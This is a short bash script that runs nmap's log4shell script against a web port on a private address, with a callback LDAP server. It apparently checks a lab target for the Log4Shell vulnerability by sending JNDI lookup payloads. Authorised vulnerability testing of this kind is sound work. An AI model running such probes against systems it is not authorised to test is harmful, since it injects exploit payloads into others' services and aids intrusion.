#!/bin/bash
nmap --script log4shell.nse --script-args log4shell.callback-server=10.111.11.150:1389 -p 8080 10.111.11.149 